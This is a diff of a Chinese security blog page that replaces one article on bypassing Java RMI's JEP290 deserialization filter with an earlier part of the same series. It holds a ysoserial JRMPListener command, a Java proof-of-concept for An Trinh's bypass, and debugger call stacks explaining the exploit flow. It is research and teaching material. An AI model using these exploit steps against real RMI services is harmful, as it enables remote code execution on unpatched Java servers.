@@ -6,29 +6,37 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://m0d9.me">
-  <title>RMI：绕过JEP290——下 | m0d9&#39;s blog</title>
+  <title>RMI：绕过JEP290——中 | m0d9&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前文留了个坑，8u231之后还出现了限制与绕过，填个坑 本节的思路：  回顾JEP290 bypass的原理 8u231的限制，老的JRMP绕过方式为何不行了 An Trinh的绕过方式 8u241的限制">
+  <meta name="description" content="本节主要解释前文留下的问题： 只是建立了恶意JRMP的连接，但是没执行bind，为什么可以打成功？ 结论流程比较复杂，先直接给结论，绕过JEP290的原理是  利用JEP290白名单内的类，覆盖掉registerRefs（此时未建立JRMP连接） Registry 处理bind请求，最后会触发DGC逻辑，DGC向registerRefs里保存的Server发送dirty请求 DGC底层使用的是St">
 <meta property="og:type" content="article">
-<meta property="og:title" content="RMI：绕过JEP290——下">
-<meta property="og:url" content="http://m0d9.me/2020/07/29/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8B/index.html">
+<meta property="og:title" content="RMI：绕过JEP290——中">
+<meta property="og:url" content="http://m0d9.me/2020/07/11/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%AD/index.html">
 <meta property="og:site_name" content="m0d9&#39;s blog">
-<meta property="og:description" content="前文留了个坑，8u231之后还出现了限制与绕过，填个坑 本节的思路：  回顾JEP290 bypass的原理 8u231的限制，老的JRMP绕过方式为何不行了 An Trinh的绕过方式 8u241的限制">
+<meta property="og:description" content="本节主要解释前文留下的问题： 只是建立了恶意JRMP的连接，但是没执行bind，为什么可以打成功？ 结论流程比较复杂，先直接给结论，绕过JEP290的原理是  利用JEP290白名单内的类，覆盖掉registerRefs（此时未建立JRMP连接） Registry 处理bind请求，最后会触发DGC逻辑，DGC向registerRefs里保存的Server发送dirty请求 DGC底层使用的是St">
 <meta property="og:locale">
-<meta property="og:image" content="http://m0d9.me/images/pasted-96.png">
-<meta property="og:image" content="http://m0d9.me/images/pasted-97.png">
-<meta property="og:image" content="http://m0d9.me/images/pasted-100.png">
-<meta property="og:image" content="http://m0d9.me/images/pasted-102.png">
-<meta property="og:image" content="http://m0d9.me/images/pasted-103.png">
-<meta property="article:published_time" content="2020-07-29T03:52:00.000Z">
-<meta property="article:modified_time" content="2020-10-10T13:20:18.825Z">
+<meta property="og:image" content="http://m0d9.me/images/pasted-59.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-89.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-74.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-75.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-76.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-77.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-78.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-79.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-80.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-81.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-82.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-83.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-85.png">
+<meta property="og:image" content="http://m0d9.me/images/pasted-84.png">
+<meta property="article:published_time" content="2020-07-11T03:35:00.000Z">
+<meta property="article:modified_time" content="2021-10-27T07:53:03.975Z">
 <meta property="article:author" content="m0d9">
 <meta property="article:tag" content="Java">
 <meta property="article:tag" content="RMI">
 <meta property="article:tag" content="JEP290">
-<meta property="article:tag" content="enableReplace">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://m0d9.me/images/pasted-96.png">
+<meta name="twitter:image" content="http://m0d9.me/images/pasted-59.png">
   
     <link rel="alternative" href="/atom.xml" title="m0d9&#39;s blog" type="application/atom+xml">
   
@@ -183,170 +191,97 @@ ga('send', 'pageview');
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-RMI：绕过JEP290——下" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-RMI：绕过JEP290——中" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      RMI：绕过JEP290——下
+      RMI：绕过JEP290——中
     </h1>
   
 
         
-        <a href="/2020/07/29/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8B/" class="archive-article-date">
-  	<time datetime="2020-07-29T03:52:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-29</time>
+        <a href="/2020/07/11/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%AD/" class="archive-article-date">
+  	<time datetime="2020-07-11T03:35:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-11</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>前文留了个坑，8u231之后还出现了限制与绕过，填个坑</p>
-<p>本节的思路：</p>
+        <p>本节主要解释前文留下的问题：</p>
+<p>只是建立了恶意JRMP的连接，但是没执行bind，为什么可以打成功？</p>
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>流程比较复杂，先直接给结论，绕过JEP290的原理是</p>
 <ol>
-<li>回顾JEP290 bypass的原理</li>
-<li>8u231的限制，老的JRMP绕过方式为何不行了</li>
-<li>An Trinh的绕过方式</li>
-<li>8u241的限制</li>
+<li>利用JEP290白名单内的类，覆盖掉registerRefs（此时未建立JRMP连接）</li>
+<li>Registry 处理bind请求，最后会触发DGC逻辑，DGC向registerRefs里保存的Server发送dirty请求</li>
+<li>DGC底层使用的是StreamRemoteCall.executeCall进行io的传输，executeCall发送完之后，会根据对方的反馈进行不同的操作，当对方返回一定条件时（初步判断是对方RMI Exception），会直接序列化InputStream，造成反序列化漏洞</li>
 </ol>
 <a id="more"></a>
 
 
-<h2 id="JEP290-JRMP绕过原理"><a href="#JEP290-JRMP绕过原理" class="headerlink" title="JEP290 JRMP绕过原理"></a>JEP290 JRMP绕过原理</h2><p>回顾前文讲过，绕过JEP290的原理如下：</p>
+<p>其中步骤2类似《RMI1》中提到的Client攻击Registry的思路，步骤3与 Registry攻击Client手法类似</p>
+<p>之前一直简单以为是Vuln Registry充当了Vuln Server的角色，走的是Evil Registry Attack Vuln Server的角色，其实并不是。纸上得来终觉浅啊</p>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p><img src="/images/pasted-59.png" alt="upload successful"></p>
 <ol>
-<li>利用JEP290白名单内的类，建立JRMP连接，覆盖掉registerRefs</li>
-<li>Registry 处理bind请求，最后会触发DGC逻辑，DGC向registerRefs里保存的Server发送dirty请求</li>
-<li>DGC底层使用的是StreamRemoteCall.executeCall进行io的传输，executeCall发送完之后，会根据对方的反馈进行不同的操作，当对方返回一定条件时（初步判断是对方RMI Exception），会直接序列化InputStream，造成反序列化漏洞</li>
+<li>Server发起bind(name,EvilObj)请求</li>
+<li>Vuln Registry接受到请求，RegistryImpl_Skel处理该请求</li>
+<li>RegistryImpl_Skel反序列化obj，在JEP290白名单内，功能为触发JRMP连接，连接Evil Registry（对应上图步骤1）（纠正，其实并未建立连接，仅覆盖registerRefs）</li>
+<li>Vuln Registry底层ConnectionInputStream，负责管理维护连接，有一个表registerRefs，维护当前的client连接记录，因为反序列化EvilObj，被覆盖成了Evil Registry的JRMP连接信息</li>
+<li>Vuln Registry准备结束掉 Server发起bind请求，调用releaseInputStream（对应上图步骤2），准备通知DGC开始介入监控这个EvilObj的生命周期。</li>
+<li>Registry DGC初始化监控远程对象时，DGCImpl_Stub会发送一个dirty请求给Server，Server信息保存在registerRefs内。但是此时的Server已经被替换为Evil Registry。</li>
+<li>DGCImpl_Stub发送dirty请求给Evil Registry，最终是用的是StreamRemoteCall.executeCall来执行（对应步骤3）。《RMI1》中Client攻击Registry时有提到StreamRemoteCall.executeCall的问题，发送完之后会根据对方返回进行下一步操作，case2会直接反序列化InputStream</li>
+<li>Evil Registry接受到Client 的DGC dirty call，发送反馈payload，被Vuln Registry接受，进入case2逻辑触发反序列化boom💣（对应步骤4）</li>
 </ol>
-<p>但是8u231中已经对此做了限制</p>
-<h3 id="8u231限制"><a href="#8u231限制" class="headerlink" title="8u231限制"></a>8u231限制</h3><p>详情可以参考【1】，讲的很详细，不赘述</p>
-<p>这里直接给出<strong>重点结论</strong></p>
-<ul>
-<li>sun.rmi.registry.RegistryImpl_Skel#dispatch报错情况消除ref</li>
-<li>sun.rmi.transport.DGCImpl_Stub#dirty提前了黑名单</li>
-</ul>
-<p><img src="/images/pasted-96.png" alt="upload successful"></p>
-<p><img src="/images/pasted-97.png" alt="upload successful"></p>
-<h3 id="An-Trinh的RMI注册端的Bypass方法"><a href="#An-Trinh的RMI注册端的Bypass方法" class="headerlink" title="An Trinh的RMI注册端的Bypass方法"></a>An Trinh的RMI注册端的Bypass方法</h3><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>直接参考【1】ysomap中的poc</p>
+<p><img src="/images/pasted-89.png" alt="upload successful"></p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>在cc链上下断点，调用栈如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">readObject:150, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">...</span><br><span class="line">cc5链</span><br><span class="line">...</span><br><span class="line">executeCall:252, StreamRemoteCall (sun.rmi.transport)</span><br><span class="line">invoke:375, UnicastRef (sun.rmi.server)</span><br><span class="line">dirty:109, DGCImpl_Stub (sun.rmi.transport)</span><br><span class="line">makeDirtyCall:382, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:324, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:160, DGCClient (sun.rmi.transport)</span><br><span class="line">registerRefs:102, ConnectionInputStream (sun.rmi.transport)</span><br><span class="line">releaseInputStream:157, StreamRemoteCall (sun.rmi.transport)</span><br><span class="line">dispatch:80, RegistryImpl_Skel (sun.rmi.registry)</span><br><span class="line">oldDispatch:468, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:300, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:200, Transport$1 (sun.rmi.transport)</span><br><span class="line">run:197, Transport$1 (sun.rmi.transport)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">serviceCall:196, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:573, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:835, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-1, 1166320987 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure>
+
+<p>需要跟一遍流程，这里就不详细的讲解了，重点需要关注</p>
 <ol>
-<li><p>Start Evil Registry</p>
-<p> <code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 &quot;open -a  calculator.app&quot;</code></p>
+<li><p>bind流程，如何触发DGC，如何发送Dirty请求</p>
 </li>
-<li><p>Start Vuln Registry</p>
-<p> 启动helloRegistry</p>
-</li>
-<li><p>启动 ysomap/core/exploit/rmi/NamingTest.java</p>
+<li><p>sun.rmi.transport.StreamRemoteCall.in.incomingRefTable是如何被覆盖的</p>
 </li>
 </ol>
-<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>同样在cc链上下断点</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">readObject:150, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">... </span><br><span class="line">cc5</span><br><span class="line">...</span><br><span class="line">executeCall:270, StreamRemoteCall (sun.rmi.transport)</span><br><span class="line">invoke:161, UnicastRef (sun.rmi.server)</span><br><span class="line">invokeRemoteMethod:227, RemoteObjectInvocationHandler (java.rmi.server)</span><br><span class="line">invoke:179, RemoteObjectInvocationHandler (java.rmi.server)</span><br><span class="line">createServerSocket:-1, $Proxy0 (com.sun.proxy)</span><br><span class="line">newServerSocket:666, TCPEndpoint (sun.rmi.transport.tcp)</span><br><span class="line">listen:335, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:254, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:411, TCPEndpoint (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:147, LiveRef (sun.rmi.transport)</span><br><span class="line">exportObject:237, UnicastServerRef (sun.rmi.server)</span><br><span class="line">exportObject:383, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">exportObject:346, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">reexport:268, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">readObject:235, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect) [1]</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:2178, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br><span class="line">dispatch:122, RegistryImpl_Skel (sun.rmi.registry)</span><br><span class="line">oldDispatch:469, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:301, UnicastServerRef (sun.rmi.server)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h3 id="正常bind-的交互流程"><a href="#正常bind-的交互流程" class="headerlink" title="正常bind 的交互流程"></a>正常bind 的交互流程</h3><p>以HelloServer、Registry为例，一次正常的bind产生的网络交互行为：<br><img src="/images/pasted-74.png" alt="upload successful"></p>
+<h4 id="1-Server端逻辑"><a href="#1-Server端逻辑" class="headerlink" title="1. Server端逻辑"></a>1. Server端逻辑</h4><p>server 序列化 “hello”、new HelloImpl()，发送给registry 1088端口，并监听等待DGC call</p>
+<p>对应的代码逻辑<br><img src="/images/pasted-75.png" alt="upload successful"></p>
+<p>跟进invoke(var3)，到StreamRemoteCall.executeCall。发送完数据之后会监听返回，并判断，如果第一个bypte为2则进行序列化（初步判断==2表示registry返回异常）</p>
+<p><img src="/images/pasted-76.png" alt="upload successful"></p>
+<p>这里的<code>var14 = this.in.readObject();</code>就是多次提到的《RMI1》中registry攻击client的原理</p>
+<h4 id="2-Registry逻辑"><a href="#2-Registry逻辑" class="headerlink" title="2. Registry逻辑"></a>2. Registry逻辑</h4><p>registry 收到server bind请求包，反序列化”hello”、HelloImpl，并准备释放链接，释放链接前会将这些这些远程类引用记录传给DGC逻辑，DGC建立每个远程类的管理记录，且发送一个dirty请求给server</p>
+<p><strong>注意这里的DGC逻辑</strong></p>
+<p>对应的几个重要代码逻辑<br><img src="/images/pasted-77.png" alt="upload successful"><br><img src="/images/pasted-78.png" alt="upload successful"><br><img src="/images/pasted-79.png" alt="upload successful"></p>
+<h3 id="覆盖StreamRemoteCall-in-incomingRefTable"><a href="#覆盖StreamRemoteCall-in-incomingRefTable" class="headerlink" title="覆盖StreamRemoteCall.in.incomingRefTable"></a>覆盖StreamRemoteCall.in.incomingRefTable</h3><p>先来看一遍反序列化EvilObj之后的对比：可以看到incomingRefTable已经被替换为恶意的Evil Registry连接地址了</p>
+<p><img src="/images/pasted-80.png" alt="upload successful"></p>
+<p><img src="/images/pasted-81.png" alt="upload successful"></p>
+<p>incomingRefTable会被当作DGC发送dirty时，认为的server地址</p>
+<p><img src="/images/pasted-82.png" alt="upload successful"></p>
+<p>具体是如何被覆盖的？</p>
+<p>断下ConnectionInputStream.saveRef</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">saveRef:73, ConnectionInputStream (sun.rmi.transport)</span><br><span class="line">read:305, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:489, UnicastRef (sun.rmi.server)</span><br><span class="line">readObject:455, RemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1158, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:2176, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2067, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1571, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:2285, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:2209, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2067, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1571, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br><span class="line">dispatch:76, RegistryImpl_Skel (sun.rmi.registry)</span><br></pre></td></tr></table></figure>
 
-<p>先来看看两次payload的区别</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test_bypass_jep290_plus</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 1. 建立RMI连接</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 2. UnicastRef</span></span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10999</span>);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.1 原jep290 的代理类</span></span><br><span class="line">        <span class="comment">// RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</span></span><br><span class="line">        <span class="comment">// Registry proxy = (Registry) Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]&#123;Registry.class&#125;, obj);</span></span><br><span class="line">        <span class="comment">// registry.bind(&quot;hello&quot;, proxy);</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.2 An Trinh jep290 bypass的代理类</span></span><br><span class="line">        RemoteObjectInvocationHandler handler = <span class="keyword">new</span> RemoteObjectInvocationHandler((RemoteRef) ref);</span><br><span class="line">        RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">                RMIServerSocketFactory.class.getClassLoader(),<span class="comment">// classloader</span></span><br><span class="line">                <span class="keyword">new</span> Class[] &#123; RMIServerSocketFactory.class, Remote.class&#125;, <span class="comment">// interfaces to implements</span></span><br><span class="line">                handler<span class="comment">// RemoteObjectInvocationHandler</span></span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// UnicastRemoteObject constructor is protected. It needs to use reflections to new a object</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="keyword">null</span>); <span class="comment">// 获取默认的</span></span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(<span class="keyword">null</span>);</span><br><span class="line">		<span class="comment">// 通过反射设置remoteObject ssf属性</span></span><br><span class="line">        ReflectionHelper.setFieldValue(remoteObject, <span class="string">&quot;ssf&quot;</span>, serverSocketFactory);</span><br><span class="line">        </span><br><span class="line">		<span class="comment">// 修改之后的lookup</span></span><br><span class="line">        Naming.lookup(registry, remoteObject);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>跟踪调试下来发现参考【1】讲解的很详细了，需要仔细阅读，没什么多的好讲的，原文涉及到的就不赘述，啰嗦下自己的理解，重要的记录下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原JEP290实际上 序列化代码反序列化过程中 并未建立JRMP连接，只是覆盖了incomingRefTable，从而影响了DGC流程触发漏洞；而An Trinh的攻击思路是 直接在反序列化的时候，建立JRMP连接，触发UnicastRef底层StreamRemoteCall的处理异常逻辑(之后还是会走原JEP290覆盖incomingRefTable的流程)。</span><br></pre></td></tr></table></figure>
-
-<p>这个调用栈很关键</p>
-<p><img src="/images/pasted-100.png" alt="upload successful"></p>
-<p>跟踪下调用栈</p>
 <ol>
-<li>UnicastRemoteObject.readObject</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    reexport();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reexport</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (csf == <span class="keyword">null</span> &amp;&amp; ssf == <span class="keyword">null</span>) &#123;</span><br><span class="line">        exportObject((Remote) <span class="keyword">this</span>, port);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        exportObject((Remote) <span class="keyword">this</span>, port, csf, ssf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<pre><code>此时的ssf为 serverSocketFactory，值为Proxy[RMIServerSocketFactory,RemoteObjectInvocationHandler[UnicastRef [liveRef: [endpoint:[127.0.0.1:10999](remote),objID:[0:0:0, 534121287]]]]]</code></pre>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">exportObject</span><span class="params">(Remote obj, <span class="keyword">int</span> port,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  RMIClientSocketFactory csf,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  RMIServerSocketFactory ssf)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> UnicastServerRef2(port, csf, ssf));</span><br><span class="line">&#125;</span><br><span class="line"> 	</span><br><span class="line"><span class="comment">// sun.rmi.server.UnicastServerRef2.class</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">UnicastServerRef2</span><span class="params">(<span class="keyword">int</span> var1, RMIClientSocketFactory var2, RMIServerSocketFactory var3)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(<span class="keyword">new</span> LiveRef(var1, var2, var3));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">        ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sref.exportObject(obj, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<pre><code>注意到此时obj属性ref被值为sref，sref=UnicastServerRef(new LiveRef(port=0, csf=null, ssf=serverSocketFactory))。
-
-是不是很类似原poc中构造UnicastRef的部分</code></pre>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10999</span>);</span><br><span class="line">UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/pasted-102.png" alt="upload successful"></p>
-<ol start="2">
-<li>UnicastServerRef/LiveRef/TCPEndpoint/TCPTransport</li>
-</ol>
-<p>这个过程比较简单</p>
-<p>UnicastServerRef$exportObject</p>
